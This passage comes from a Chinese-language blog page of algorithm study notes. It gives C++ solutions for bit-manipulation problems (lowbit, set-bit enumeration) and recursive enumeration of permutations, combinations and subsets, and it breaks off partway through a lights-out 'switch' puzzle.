class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>pair&lt;string, <span class="hljs-type">int</span>&gt; ops[<span class="hljs-number">100010</span>];<br><span class="hljs-type">int</span> n, m;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> bit, <span class="hljs-type">int</span> now)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> oper = ops[i].second;<br><span class="hljs-type">int</span> x = oper &gt;&gt; bit &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (ops[i].first == <span class="hljs-string">&quot;AND&quot;</span>) now &amp;= x;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ops[i].first == <span class="hljs-string">&quot;OR&quot;</span>) now |= x;<br><span class="hljs-keyword">else</span> now ^= x;<br>&#125;<br><span class="hljs-keyword">return</span> now;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-type">char</span> op[<span class="hljs-number">5</span>];<br><span class="hljs-type">int</span> x;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s%d&quot;</span>, op, &amp;x);<br>ops[i] = <span class="hljs-built_in">make_pair</span>(op, x);<br>&#125;<br><span class="hljs-type">int</span> val = <span class="hljs-number">0</span>;                    <span class="hljs-comment">//当前值</span><br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;                    <span class="hljs-comment">//计算后的值</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">29</span>; i &gt;= <span class="hljs-number">0</span>; i--)   <span class="hljs-comment">//高往低，逐比特</span><br>&#123;<br><span class="hljs-type">int</span> ret0 = <span class="hljs-built_in">cal</span>(i, <span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> ret1 = <span class="hljs-built_in">cal</span>(i, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (val + (<span class="hljs-number">1</span> &lt;&lt; i) &lt;= m &amp;&amp;  ret0 &lt; ret1)  <span class="hljs-comment">//置1只有填1后，不超过m且返回值比填0的大</span><br>&#123;<br>val += <span class="hljs-number">1</span> &lt;&lt; i;<br>ans += ret1 &lt;&lt; i;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>ans += ret0 &lt;&lt; i;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="lowbit计算">lowbit()计算</h4><p><code>lowbit(n) = n &amp;(~n+1) = n &amp; (-n)</code></p><h5 id="int整数二进制表示所有是1的位">int整数二进制表示所有是1的位</h5><p>利用lowbit+hash</p><p>h(2^k) = k</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> h[(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>) + <span class="hljs-number">1</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">20</span>; i++) h[<span class="hljs-number">1</span> &lt;&lt; i] = i;<br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n)<br>&#123;<br><span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; h[n &amp; (-n)] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>n -= n &amp; (-n);<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>数学小技巧：当k在0~35时，2^k mod 37 互不相等，且恰好取遍1-36</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> h[(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>) + <span class="hljs-number">1</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">20</span>; i++) h[(<span class="hljs-number">1</span> &lt;&lt; i) % <span class="hljs-number">37</span>] = i;<br><span class="hljs-type">int</span> n;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n)<br>&#123;<br><span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; h[(n &amp; (-n)) % <span class="hljs-number">37</span>] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>n -= n &amp; (-n);<br>&#125;<br>cout &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="递推与递归">递推与递归</h3><h4 id="枚举元组">枚举元组</h4><p>全排列可重复版，不用加chosen</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, k;<br><span class="hljs-type">int</span> order[<span class="hljs-number">6</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (x == n + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cout &lt;&lt; order[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= k; i++)<br>&#123;<br>order[x] = i;<br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; k;<br><span class="hljs-built_in">cal</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="递归实现排列型全排列">递归实现排列型（全排列）</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> order[<span class="hljs-number">15</span>];<br><span class="hljs-type">bool</span> chosen[<span class="hljs-number">15</span>];  <span class="hljs-comment">//是否被选过</span><br> <br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (x == n + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cout &lt;&lt; order[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (chosen[i]) <span class="hljs-keyword">continue</span>;<br>order[x] = i;<br>chosen[i] = <span class="hljs-literal">true</span>;<br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);<br>chosen[i] = <span class="hljs-literal">false</span>;   <span class="hljs-comment">//恢复现场</span><br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n ;<br><span class="hljs-built_in">cal</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="递归实现排列型ank">递归实现排列型（A(n,k))</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, k;<br><span class="hljs-type">int</span> order[<span class="hljs-number">15</span>];<br><span class="hljs-type">bool</span> chosen[<span class="hljs-number">15</span>];  <span class="hljs-comment">//是否被选过</span><br> <br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (x == k + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= k; i++)<br>&#123;<br>cout &lt;&lt; order[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br> &#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (chosen[i]) <span class="hljs-keyword">continue</span>;<br>order[x] = i;<br>chosen[i] = <span class="hljs-literal">true</span>;<br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);<br>chosen[i] = <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; k;<br><span class="hljs-built_in">cal</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="递归实现指数型枚举">递归实现指数型枚举</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">bool</span> order[<span class="hljs-number">15</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (x == n + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (order[i]) cout &lt;&lt; <span class="hljs-string">&quot;Y&quot;</span>;<br><span class="hljs-keyword">else</span> cout &lt;&lt; <span class="hljs-string">&quot;N&quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);       <span class="hljs-comment">//不选</span><br>    <br>order[x] = <span class="hljs-literal">true</span>;  <br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);       <span class="hljs-comment">//选</span><br>order[x] = <span class="hljs-literal">false</span>; <span class="hljs-comment">//还原现场</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-built_in">cal</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="递归实现组合型枚举cnk">递归实现组合型枚举(C(n,k))</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n, m;<br>vector&lt;<span class="hljs-type">int</span>&gt; order;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (order.<span class="hljs-built_in">size</span>() &gt; m || order.<span class="hljs-built_in">size</span>() + n - x + <span class="hljs-number">1</span> &lt; m) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">//指数型枚举上添加该限制</span><br><span class="hljs-keyword">if</span> (x == n + <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; order.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br>cout &lt;&lt; order[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>order.<span class="hljs-built_in">push_back</span>(x); <span class="hljs-comment">//选</span><br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);<br>order.<span class="hljs-built_in">pop_back</span>();<br>    <br><span class="hljs-built_in">cal</span>(x + <span class="hljs-number">1</span>);         <span class="hljs-comment">//不选</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-built_in">cal</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="费解的开关">费解的开关</h4><p>思路：</p><p>固定第一行，满足的方案只有一种，只通过改变下一行来调节上一行；</p><p>枚举第一行的所有情况（32种），其余方案也随之确定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">char</span> g[<span class="hljs-number">6</span>][<span class="hljs-number">6</span>];<br><span class="hljs-type">char</span> backup[<span class="hljs-number">6</span>][<span class="hljs-number">6</span>];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> dx[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>&#125;;   <span class="hljs-comment">//原地</span><br><span class="hljs-type">int</span> dy[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">turn</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>&#123;<br><span class="hljs-type">int</span> xx = x + dx[i];<br><span class="hljs-type">int</span> yy = y + dy[i];<br><span class="hljs-keyword">if</span> (xx &gt;= <span class="hljs-number">0</span> &amp;&amp; xx &lt;= <span class="hljs-number">4</span> &amp;&amp; yy &gt;= <span class="hljs-number">0</span> &amp;&amp; yy &lt;= <span class="hljs-number">4</span>)<br>&#123;<br>g[xx][yy] ^= <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">while</span> (n--)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>&#123;<br>cin &gt;&gt; g[i];<br>&#125;<br><span class="hljs-type">int</span> minans = <span class="hljs-number">7</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>); i++)   <span class="hljs-comment">// 列举第一行的所有情况 -&gt; 所有操作</span><br>&#123;<br><span class="hljs-type">bool</span> light = <span class="hljs-literal">true</span>;<br><span class="hljs-built_in">memcpy</span>(backup, g, <span class="hljs-keyword">sizeof</span> g);<br><span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">5</span>; k++)<br>&#123;<br><span class="hljs-keyword">if</span> (i &gt;&gt; k &amp; <span class="hljs-number">1</span>)<br>&#123;<br>step++;<br><span class="hljs-built_in">turn</span>(<span class="hljs-number">0</span>, k);<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= <span class="hljs-number">4</span>; k++)     <span class="hljs-comment">//固定第一行，按2-5行</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (g[k - <span class="hljs-number">1</span>][j] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>&#123;<br>step++;<br><span class="hljs-built_in">turn</span>(k, j);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">5</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (g[<span class="hljs-number">4</span>][j] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>&#123;<br>light = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (light)<br>&#123;<br>minans = <span class="hljs-built_in">min</span>(minans, step);<br>&#125;<br><span class="hljs-built_in">memcpy</span>(g, backup, <span class="hljs-keyword">sizeof</span> g);<br>&#125; <br><span class="hljs-keyword">if</span> (minans &lt;= <span class="hljs-number">6</span>) cout &lt;&lt; minans &lt;&lt; endl;<br><span class="hljs-keyword">else</span> cout &lt;&lt; <span 